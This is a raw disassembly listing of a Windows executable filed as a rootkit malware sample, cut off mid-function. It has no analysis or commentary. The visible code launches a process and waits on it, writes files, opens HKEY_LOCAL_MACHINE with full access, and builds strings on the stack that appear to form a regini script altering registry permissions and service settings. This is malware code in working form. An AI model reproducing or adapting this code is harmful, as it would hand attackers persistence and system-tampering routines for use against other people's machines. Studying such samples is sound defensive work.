
malware_samples/rootkit/bff9b75ae2eea49a765f79d9c67c997edb6c67a2cc720c6187dd2f67980acab7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 40 00 00 00    	sub    $0x40,%esp
  401009:	90                   	nop
  40100a:	b8 00 30 40 00       	mov    $0x403000,%eax
  40100f:	50                   	push   %eax
  401010:	e8 63 13 00 00       	call   0x402378
  401015:	b9 0c 30 40 00       	mov    $0x40300c,%ecx
  40101a:	51                   	push   %ecx
  40101b:	50                   	push   %eax
  40101c:	e8 5f 13 00 00       	call   0x402380
  401021:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401024:	b8 00 00 00 00       	mov    $0x0,%eax
  401029:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40102c:	b8 38 00 00 00       	mov    $0x38,%eax
  401031:	50                   	push   %eax
  401032:	b8 00 00 00 00       	mov    $0x0,%eax
  401037:	50                   	push   %eax
  401038:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40103b:	50                   	push   %eax
  40103c:	e8 47 13 00 00       	call   0x402388
  401041:	83 c4 0c             	add    $0xc,%esp
  401044:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401049:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40104c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40104f:	83 c0 04             	add    $0x4,%eax
  401052:	b9 40 00 00 00       	mov    $0x40,%ecx
  401057:	89 08                	mov    %ecx,(%eax)
  401059:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40105c:	83 c0 08             	add    $0x8,%eax
  40105f:	b9 00 00 00 00       	mov    $0x0,%ecx
  401064:	89 08                	mov    %ecx,(%eax)
  401066:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401069:	83 c0 0c             	add    $0xc,%eax
  40106c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401071:	89 08                	mov    %ecx,(%eax)
  401073:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401076:	83 c0 10             	add    $0x10,%eax
  401079:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40107c:	89 08                	mov    %ecx,(%eax)
  40107e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401081:	83 c0 14             	add    $0x14,%eax
  401084:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401087:	89 08                	mov    %ecx,(%eax)
  401089:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40108c:	83 c0 18             	add    $0x18,%eax
  40108f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401092:	89 08                	mov    %ecx,(%eax)
  401094:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401097:	83 c0 1c             	add    $0x1c,%eax
  40109a:	b9 00 00 00 00       	mov    $0x0,%ecx
  40109f:	89 08                	mov    %ecx,(%eax)
  4010a1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010a4:	83 c0 20             	add    $0x20,%eax
  4010a7:	b9 00 00 00 00       	mov    $0x0,%ecx
  4010ac:	89 08                	mov    %ecx,(%eax)
  4010ae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010b1:	50                   	push   %eax
  4010b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4010b5:	ff d0                	call   *%eax
  4010b7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010ba:	83 c0 38             	add    $0x38,%eax
  4010bd:	8b 08                	mov    (%eax),%ecx
  4010bf:	83 f9 00             	cmp    $0x0,%ecx
  4010c2:	0f 84 14 00 00 00    	je     0x4010dc
  4010c8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010cb:	83 c0 38             	add    $0x38,%eax
  4010ce:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  4010d3:	51                   	push   %ecx
  4010d4:	8b 08                	mov    (%eax),%ecx
  4010d6:	51                   	push   %ecx
  4010d7:	e8 b4 12 00 00       	call   0x402390
  4010dc:	c9                   	leave
  4010dd:	c3                   	ret
  4010de:	55                   	push   %ebp
  4010df:	89 e5                	mov    %esp,%ebp
  4010e1:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4010e7:	90                   	nop
  4010e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ed:	50                   	push   %eax
  4010ee:	b8 80 00 00 00       	mov    $0x80,%eax
  4010f3:	50                   	push   %eax
  4010f4:	b8 02 00 00 00       	mov    $0x2,%eax
  4010f9:	50                   	push   %eax
  4010fa:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ff:	50                   	push   %eax
  401100:	b8 03 00 00 00       	mov    $0x3,%eax
  401105:	50                   	push   %eax
  401106:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  40110b:	50                   	push   %eax
  40110c:	8b 45 08             	mov    0x8(%ebp),%eax
  40110f:	50                   	push   %eax
  401110:	e8 83 12 00 00       	call   0x402398
  401115:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401118:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40111b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40111e:	0f 84 45 00 00 00    	je     0x401169
  401124:	8b 45 0c             	mov    0xc(%ebp),%eax
  401127:	50                   	push   %eax
  401128:	e8 73 12 00 00       	call   0x4023a0
  40112d:	83 c4 04             	add    $0x4,%esp
  401130:	b9 00 00 00 00       	mov    $0x0,%ecx
  401135:	51                   	push   %ecx
  401136:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  401139:	51                   	push   %ecx
  40113a:	50                   	push   %eax
  40113b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40113e:	50                   	push   %eax
  40113f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401142:	50                   	push   %eax
  401143:	e8 60 12 00 00       	call   0x4023a8
  401148:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40114b:	50                   	push   %eax
  40114c:	e8 5f 12 00 00       	call   0x4023b0
  401151:	b8 00 00 00 00       	mov    $0x0,%eax
  401156:	50                   	push   %eax
  401157:	8b 45 08             	mov    0x8(%ebp),%eax
  40115a:	50                   	push   %eax
  40115b:	b8 1c 30 40 00       	mov    $0x40301c,%eax
  401160:	50                   	push   %eax
  401161:	e8 9a fe ff ff       	call   0x401000
  401166:	83 c4 0c             	add    $0xc,%esp
  401169:	b8 00 00 00 00       	mov    $0x0,%eax
  40116e:	e9 00 00 00 00       	jmp    0x401173
  401173:	c9                   	leave
  401174:	c3                   	ret
  401175:	55                   	push   %ebp
  401176:	89 e5                	mov    %esp,%ebp
  401178:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40117e:	90                   	nop
  40117f:	8b 45 08             	mov    0x8(%ebp),%eax
  401182:	50                   	push   %eax
  401183:	e8 30 12 00 00       	call   0x4023b8
  401188:	83 c4 04             	add    $0x4,%esp
  40118b:	b9 00 00 00 00       	mov    $0x0,%ecx
  401190:	51                   	push   %ecx
  401191:	b9 00 00 00 00       	mov    $0x0,%ecx
  401196:	51                   	push   %ecx
  401197:	b9 00 00 00 00       	mov    $0x0,%ecx
  40119c:	51                   	push   %ecx
  40119d:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011a2:	51                   	push   %ecx
  4011a3:	50                   	push   %eax
  4011a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4011a7:	50                   	push   %eax
  4011a8:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ad:	50                   	push   %eax
  4011ae:	b8 00 00 00 00       	mov    $0x0,%eax
  4011b3:	50                   	push   %eax
  4011b4:	e8 07 12 00 00       	call   0x4023c0
  4011b9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4011bf:	83 c0 01             	add    $0x1,%eax
  4011c2:	50                   	push   %eax
  4011c3:	e8 00 12 00 00       	call   0x4023c8
  4011c8:	83 c4 04             	add    $0x4,%esp
  4011cb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4011d1:	50                   	push   %eax
  4011d2:	e8 e1 11 00 00       	call   0x4023b8
  4011d7:	83 c4 04             	add    $0x4,%esp
  4011da:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011df:	51                   	push   %ecx
  4011e0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011e5:	51                   	push   %ecx
  4011e6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4011e9:	51                   	push   %ecx
  4011ea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011ed:	51                   	push   %ecx
  4011ee:	50                   	push   %eax
  4011ef:	8b 45 08             	mov    0x8(%ebp),%eax
  4011f2:	50                   	push   %eax
  4011f3:	b8 00 00 00 00       	mov    $0x0,%eax
  4011f8:	50                   	push   %eax
  4011f9:	b8 00 00 00 00       	mov    $0x0,%eax
  4011fe:	50                   	push   %eax
  4011ff:	e8 bc 11 00 00       	call   0x4023c0
  401204:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401207:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40120a:	01 c8                	add    %ecx,%eax
  40120c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401211:	88 08                	mov    %cl,(%eax)
  401213:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401216:	e9 00 00 00 00       	jmp    0x40121b
  40121b:	c9                   	leave
  40121c:	c3                   	ret
  40121d:	55                   	push   %ebp
  40121e:	89 e5                	mov    %esp,%ebp
  401220:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401226:	90                   	nop
  401227:	b8 00 00 00 00       	mov    $0x0,%eax
  40122c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40122f:	b8 00 00 00 00       	mov    $0x0,%eax
  401234:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401237:	b8 00 00 00 00       	mov    $0x0,%eax
  40123c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40123f:	b8 23 30 40 00       	mov    $0x403023,%eax
  401244:	50                   	push   %eax
  401245:	e8 2e 11 00 00       	call   0x402378
  40124a:	b9 30 30 40 00       	mov    $0x403030,%ecx
  40124f:	51                   	push   %ecx
  401250:	50                   	push   %eax
  401251:	e8 2a 11 00 00       	call   0x402380
  401256:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401259:	b8 40 30 40 00       	mov    $0x403040,%eax
  40125e:	50                   	push   %eax
  40125f:	e8 14 11 00 00       	call   0x402378
  401264:	b9 4d 30 40 00       	mov    $0x40304d,%ecx
  401269:	51                   	push   %ecx
  40126a:	50                   	push   %eax
  40126b:	e8 10 11 00 00       	call   0x402380
  401270:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401273:	b8 5e 30 40 00       	mov    $0x40305e,%eax
  401278:	50                   	push   %eax
  401279:	e8 fa 10 00 00       	call   0x402378
  40127e:	b9 6b 30 40 00       	mov    $0x40306b,%ecx
  401283:	51                   	push   %ecx
  401284:	50                   	push   %eax
  401285:	e8 f6 10 00 00       	call   0x402380
  40128a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40128d:	b8 00 00 00 00       	mov    $0x0,%eax
  401292:	50                   	push   %eax
  401293:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401296:	50                   	push   %eax
  401297:	b8 00 00 00 00       	mov    $0x0,%eax
  40129c:	50                   	push   %eax
  40129d:	b8 3f 00 0f 00       	mov    $0xf003f,%eax
  4012a2:	50                   	push   %eax
  4012a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4012a8:	50                   	push   %eax
  4012a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4012ae:	50                   	push   %eax
  4012af:	b8 00 00 00 00       	mov    $0x0,%eax
  4012b4:	50                   	push   %eax
  4012b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4012b8:	50                   	push   %eax
  4012b9:	b8 02 00 00 80       	mov    $0x80000002,%eax
  4012be:	50                   	push   %eax
  4012bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4012c2:	ff d0                	call   *%eax
  4012c4:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012c9:	39 c1                	cmp    %eax,%ecx
  4012cb:	0f 84 0a 00 00 00    	je     0x4012db
  4012d1:	b8 00 00 00 00       	mov    $0x0,%eax
  4012d6:	e9 e3 01 00 00       	jmp    0x4014be
  4012db:	b8 00 00 00 00       	mov    $0x0,%eax
  4012e0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4012e3:	b8 04 00 00 00       	mov    $0x4,%eax
  4012e8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4012eb:	b8 00 02 00 00       	mov    $0x200,%eax
  4012f0:	50                   	push   %eax
  4012f1:	e8 d2 10 00 00       	call   0x4023c8
  4012f6:	83 c4 04             	add    $0x4,%esp
  4012f9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4012fc:	b8 00 02 00 00       	mov    $0x200,%eax
  401301:	50                   	push   %eax
  401302:	b8 00 00 00 00       	mov    $0x0,%eax
  401307:	50                   	push   %eax
  401308:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40130b:	50                   	push   %eax
  40130c:	e8 77 10 00 00       	call   0x402388
  401311:	83 c4 0c             	add    $0xc,%esp
  401314:	b8 00 02 00 00       	mov    $0x200,%eax
  401319:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40131c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40131f:	50                   	push   %eax
  401320:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401323:	50                   	push   %eax
  401324:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401327:	50                   	push   %eax
  401328:	b8 00 00 00 00       	mov    $0x0,%eax
  40132d:	50                   	push   %eax
  40132e:	b8 78 30 40 00       	mov    $0x403078,%eax
  401333:	50                   	push   %eax
  401334:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401337:	50                   	push   %eax
  401338:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40133b:	ff d0                	call   *%eax
  40133d:	83 f8 00             	cmp    $0x0,%eax
  401340:	0f 84 05 00 00 00    	je     0x40134b
  401346:	e9 3e 01 00 00       	jmp    0x401489
  40134b:	b8 00 02 00 00       	mov    $0x200,%eax
  401350:	50                   	push   %eax
  401351:	b8 00 00 00 00       	mov    $0x0,%eax
  401356:	50                   	push   %eax
  401357:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40135a:	50                   	push   %eax
  40135b:	e8 28 10 00 00       	call   0x402388
  401360:	83 c4 0c             	add    $0xc,%esp
  401363:	b8 00 02 00 00       	mov    $0x200,%eax
  401368:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40136b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40136e:	50                   	push   %eax
  40136f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401372:	50                   	push   %eax
  401373:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401376:	50                   	push   %eax
  401377:	b8 00 00 00 00       	mov    $0x0,%eax
  40137c:	50                   	push   %eax
  40137d:	b8 92 30 40 00       	mov    $0x403092,%eax
  401382:	50                   	push   %eax
  401383:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401386:	50                   	push   %eax
  401387:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40138a:	ff d0                	call   *%eax
  40138c:	83 f8 00             	cmp    $0x0,%eax
  40138f:	0f 84 05 00 00 00    	je     0x40139a
  401395:	e9 ef 00 00 00       	jmp    0x401489
  40139a:	b8 00 02 00 00       	mov    $0x200,%eax
  40139f:	50                   	push   %eax
  4013a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4013a5:	50                   	push   %eax
  4013a6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013a9:	50                   	push   %eax
  4013aa:	e8 d9 0f 00 00       	call   0x402388
  4013af:	83 c4 0c             	add    $0xc,%esp
  4013b2:	b8 00 02 00 00       	mov    $0x200,%eax
  4013b7:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013ba:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4013bd:	50                   	push   %eax
  4013be:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013c1:	50                   	push   %eax
  4013c2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4013c5:	50                   	push   %eax
  4013c6:	b8 00 00 00 00       	mov    $0x0,%eax
  4013cb:	50                   	push   %eax
  4013cc:	b8 9e 30 40 00       	mov    $0x40309e,%eax
  4013d1:	50                   	push   %eax
  4013d2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013d5:	50                   	push   %eax
  4013d6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4013d9:	ff d0                	call   *%eax
  4013db:	83 f8 00             	cmp    $0x0,%eax
  4013de:	0f 84 05 00 00 00    	je     0x4013e9
  4013e4:	e9 a0 00 00 00       	jmp    0x401489
  4013e9:	b8 01 00 00 00       	mov    $0x1,%eax
  4013ee:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4013f1:	b8 00 02 00 00       	mov    $0x200,%eax
  4013f6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013f9:	b8 00 02 00 00       	mov    $0x200,%eax
  4013fe:	50                   	push   %eax
  4013ff:	b8 00 00 00 00       	mov    $0x0,%eax
  401404:	50                   	push   %eax
  401405:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401408:	50                   	push   %eax
  401409:	e8 7a 0f 00 00       	call   0x402388
  40140e:	83 c4 0c             	add    $0xc,%esp
  401411:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401414:	50                   	push   %eax
  401415:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401418:	50                   	push   %eax
  401419:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40141c:	50                   	push   %eax
  40141d:	b8 00 00 00 00       	mov    $0x0,%eax
  401422:	50                   	push   %eax
  401423:	b8 a8 30 40 00       	mov    $0x4030a8,%eax
  401428:	50                   	push   %eax
  401429:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40142c:	50                   	push   %eax
  40142d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401430:	ff d0                	call   *%eax
  401432:	83 f8 00             	cmp    $0x0,%eax
  401435:	0f 84 0a 00 00 00    	je     0x401445
  40143b:	e9 49 00 00 00       	jmp    0x401489
  401440:	e9 3c 00 00 00       	jmp    0x401481
  401445:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401448:	50                   	push   %eax
  401449:	e8 27 fd ff ff       	call   0x401175
  40144e:	83 c4 04             	add    $0x4,%esp
  401451:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401454:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401457:	83 f8 00             	cmp    $0x0,%eax
  40145a:	0f 84 21 00 00 00    	je     0x401481
  401460:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401463:	83 c0 04             	add    $0x4,%eax
  401466:	50                   	push   %eax
  401467:	8b 45 0c             	mov    0xc(%ebp),%eax
  40146a:	50                   	push   %eax
  40146b:	e8 60 0f 00 00       	call   0x4023d0
  401470:	83 c4 08             	add    $0x8,%esp
  401473:	83 f8 00             	cmp    $0x0,%eax
  401476:	0f 84 05 00 00 00    	je     0x401481
  40147c:	e9 08 00 00 00       	jmp    0x401489
  401481:	b8 01 00 00 00       	mov    $0x1,%eax
  401486:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401489:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40148c:	83 f8 00             	cmp    $0x0,%eax
  40148f:	0f 84 0c 00 00 00    	je     0x4014a1
  401495:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401498:	50                   	push   %eax
  401499:	e8 3a 0f 00 00       	call   0x4023d8
  40149e:	83 c4 04             	add    $0x4,%esp
  4014a1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4014a4:	50                   	push   %eax
  4014a5:	e8 2e 0f 00 00       	call   0x4023d8
  4014aa:	83 c4 04             	add    $0x4,%esp
  4014ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014b0:	50                   	push   %eax
  4014b1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4014b4:	ff d0                	call   *%eax
  4014b6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4014b9:	e9 00 00 00 00       	jmp    0x4014be
  4014be:	c9                   	leave
  4014bf:	c3                   	ret
  4014c0:	55                   	push   %ebp
  4014c1:	89 e5                	mov    %esp,%ebp
  4014c3:	81 ec 9c 04 00 00    	sub    $0x49c,%esp
  4014c9:	90                   	nop
  4014ca:	b8 48 00 00 00       	mov    $0x48,%eax
  4014cf:	88 85 6d ff ff ff    	mov    %al,-0x93(%ebp)
  4014d5:	b8 4b 00 00 00       	mov    $0x4b,%eax
  4014da:	88 85 6e ff ff ff    	mov    %al,-0x92(%ebp)
  4014e0:	b8 45 00 00 00       	mov    $0x45,%eax
  4014e5:	88 85 6f ff ff ff    	mov    %al,-0x91(%ebp)
  4014eb:	b8 59 00 00 00       	mov    $0x59,%eax
  4014f0:	88 85 70 ff ff ff    	mov    %al,-0x90(%ebp)
  4014f6:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4014fb:	88 85 71 ff ff ff    	mov    %al,-0x8f(%ebp)
  401501:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401506:	88 85 72 ff ff ff    	mov    %al,-0x8e(%ebp)
  40150c:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401511:	88 85 73 ff ff ff    	mov    %al,-0x8d(%ebp)
  401517:	b8 43 00 00 00       	mov    $0x43,%eax
  40151c:	88 85 74 ff ff ff    	mov    %al,-0x8c(%ebp)
  401522:	b8 41 00 00 00       	mov    $0x41,%eax
  401527:	88 85 75 ff ff ff    	mov    %al,-0x8b(%ebp)
  40152d:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401532:	88 85 76 ff ff ff    	mov    %al,-0x8a(%ebp)
  401538:	b8 5f 00 00 00       	mov    $0x5f,%eax
  40153d:	88 85 77 ff ff ff    	mov    %al,-0x89(%ebp)
  401543:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401548:	88 85 78 ff ff ff    	mov    %al,-0x88(%ebp)
  40154e:	b8 41 00 00 00       	mov    $0x41,%eax
  401553:	88 85 79 ff ff ff    	mov    %al,-0x87(%ebp)
  401559:	b8 43 00 00 00       	mov    $0x43,%eax
  40155e:	88 85 7a ff ff ff    	mov    %al,-0x86(%ebp)
  401564:	b8 48 00 00 00       	mov    $0x48,%eax
  401569:	88 85 7b ff ff ff    	mov    %al,-0x85(%ebp)
  40156f:	b8 49 00 00 00       	mov    $0x49,%eax
  401574:	88 85 7c ff ff ff    	mov    %al,-0x84(%ebp)
  40157a:	b8 4e 00 00 00       	mov    $0x4e,%eax
  40157f:	88 85 7d ff ff ff    	mov    %al,-0x83(%ebp)
  401585:	b8 45 00 00 00       	mov    $0x45,%eax
  40158a:	88 85 7e ff ff ff    	mov    %al,-0x82(%ebp)
  401590:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401595:	88 85 7f ff ff ff    	mov    %al,-0x81(%ebp)
  40159b:	b8 25 00 00 00       	mov    $0x25,%eax
  4015a0:	88 45 80             	mov    %al,-0x80(%ebp)
  4015a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4015a8:	88 45 81             	mov    %al,-0x7f(%ebp)
  4015ab:	b8 20 00 00 00       	mov    $0x20,%eax
  4015b0:	88 45 82             	mov    %al,-0x7e(%ebp)
  4015b3:	b8 5b 00 00 00       	mov    $0x5b,%eax
  4015b8:	88 45 83             	mov    %al,-0x7d(%ebp)
  4015bb:	b8 31 00 00 00       	mov    $0x31,%eax
  4015c0:	88 45 84             	mov    %al,-0x7c(%ebp)
  4015c3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015c8:	88 45 85             	mov    %al,-0x7b(%ebp)
  4015cb:	b8 37 00 00 00       	mov    $0x37,%eax
  4015d0:	88 45 86             	mov    %al,-0x7a(%ebp)
  4015d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015d8:	88 45 87             	mov    %al,-0x79(%ebp)
  4015db:	b8 31 00 00 00       	mov    $0x31,%eax
  4015e0:	88 45 88             	mov    %al,-0x78(%ebp)
  4015e3:	b8 37 00 00 00       	mov    $0x37,%eax
  4015e8:	88 45 89             	mov    %al,-0x77(%ebp)
  4015eb:	b8 5d 00 00 00       	mov    $0x5d,%eax
  4015f0:	88 45 8a             	mov    %al,-0x76(%ebp)
  4015f3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4015f8:	88 45 8b             	mov    %al,-0x75(%ebp)
  4015fb:	b8 0a 00 00 00       	mov    $0xa,%eax
  401600:	88 45 8c             	mov    %al,-0x74(%ebp)
  401603:	b8 48 00 00 00       	mov    $0x48,%eax
  401608:	88 45 8d             	mov    %al,-0x73(%ebp)
  40160b:	b8 4b 00 00 00       	mov    $0x4b,%eax
  401610:	88 45 8e             	mov    %al,-0x72(%ebp)
  401613:	b8 45 00 00 00       	mov    $0x45,%eax
  401618:	88 45 8f             	mov    %al,-0x71(%ebp)
  40161b:	b8 59 00 00 00       	mov    $0x59,%eax
  401620:	88 45 90             	mov    %al,-0x70(%ebp)
  401623:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401628:	88 45 91             	mov    %al,-0x6f(%ebp)
  40162b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401630:	88 45 92             	mov    %al,-0x6e(%ebp)
  401633:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401638:	88 45 93             	mov    %al,-0x6d(%ebp)
  40163b:	b8 43 00 00 00       	mov    $0x43,%eax
  401640:	88 45 94             	mov    %al,-0x6c(%ebp)
  401643:	b8 41 00 00 00       	mov    $0x41,%eax
  401648:	88 45 95             	mov    %al,-0x6b(%ebp)
  40164b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401650:	88 45 96             	mov    %al,-0x6a(%ebp)
  401653:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401658:	88 45 97             	mov    %al,-0x69(%ebp)
  40165b:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401660:	88 45 98             	mov    %al,-0x68(%ebp)
  401663:	b8 41 00 00 00       	mov    $0x41,%eax
  401668:	88 45 99             	mov    %al,-0x67(%ebp)
  40166b:	b8 43 00 00 00       	mov    $0x43,%eax
  401670:	88 45 9a             	mov    %al,-0x66(%ebp)
  401673:	b8 48 00 00 00       	mov    $0x48,%eax
  401678:	88 45 9b             	mov    %al,-0x65(%ebp)
  40167b:	b8 49 00 00 00       	mov    $0x49,%eax
  401680:	88 45 9c             	mov    %al,-0x64(%ebp)
  401683:	b8 4e 00 00 00       	mov    $0x4e,%eax
  401688:	88 45 9d             	mov    %al,-0x63(%ebp)
  40168b:	b8 45 00 00 00       	mov    $0x45,%eax
  401690:	88 45 9e             	mov    %al,-0x62(%ebp)
  401693:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401698:	88 45 9f             	mov    %al,-0x61(%ebp)
  40169b:	b8 25 00 00 00       	mov    $0x25,%eax
  4016a0:	88 45 a0             	mov    %al,-0x60(%ebp)
  4016a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4016a8:	88 45 a1             	mov    %al,-0x5f(%ebp)
  4016ab:	b8 0d 00 00 00       	mov    $0xd,%eax
  4016b0:	88 45 a2             	mov    %al,-0x5e(%ebp)
  4016b3:	b8 0a 00 00 00       	mov    $0xa,%eax
  4016b8:	88 45 a3             	mov    %al,-0x5d(%ebp)
  4016bb:	b8 45 00 00 00       	mov    $0x45,%eax
  4016c0:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4016c3:	b8 72 00 00 00       	mov    $0x72,%eax
  4016c8:	88 45 a5             	mov    %al,-0x5b(%ebp)
  4016cb:	b8 72 00 00 00       	mov    $0x72,%eax
  4016d0:	88 45 a6             	mov    %al,-0x5a(%ebp)
  4016d3:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016d8:	88 45 a7             	mov    %al,-0x59(%ebp)
  4016db:	b8 72 00 00 00       	mov    $0x72,%eax
  4016e0:	88 45 a8             	mov    %al,-0x58(%ebp)
  4016e3:	b8 43 00 00 00       	mov    $0x43,%eax
  4016e8:	88 45 a9             	mov    %al,-0x57(%ebp)
  4016eb:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016f0:	88 45 aa             	mov    %al,-0x56(%ebp)
  4016f3:	b8 6e 00 00 00       	mov    $0x6e,%eax
  4016f8:	88 45 ab             	mov    %al,-0x55(%ebp)
  4016fb:	b8 74 00 00 00       	mov    $0x74,%eax
  401700:	88 45 ac             	mov    %al,-0x54(%ebp)
  401703:	b8 72 00 00 00       	mov    $0x72,%eax
  401708:	88 45 ad             	mov    %al,-0x53(%ebp)
  40170b:	b8 6f 00 00 00       	mov    $0x6f,%eax
  401710:	88 45 ae             	mov    %al,-0x52(%ebp)
  401713:	b8 6c 00 00 00       	mov    $0x6c,%eax
  401718:	88 45 af             	mov    %al,-0x51(%ebp)
  40171b:	b8 20 00 00 00       	mov    $0x20,%eax
  401720:	88 45 b0             	mov    %al,-0x50(%ebp)
  401723:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401728:	88 45 b1             	mov    %al,-0x4f(%ebp)
  40172b:	b8 20 00 00 00       	mov    $0x20,%eax
  401730:	88 45 b2             	mov    %al,-0x4e(%ebp)
  401733:	b8 52 00 00 00       	mov    $0x52,%eax
  401738:	88 45 b3             	mov    %al,-0x4d(%ebp)
  40173b:	b8 45 00 00 00       	mov    $0x45,%eax
  401740:	88 45 b4             	mov    %al,-0x4c(%ebp)
  401743:	b8 47 00 00 00       	mov    $0x47,%eax
  401748:	88 45 b5             	mov    %al,-0x4b(%ebp)
  40174b:	b8 5f 00 00 00       	mov    $0x5f,%eax
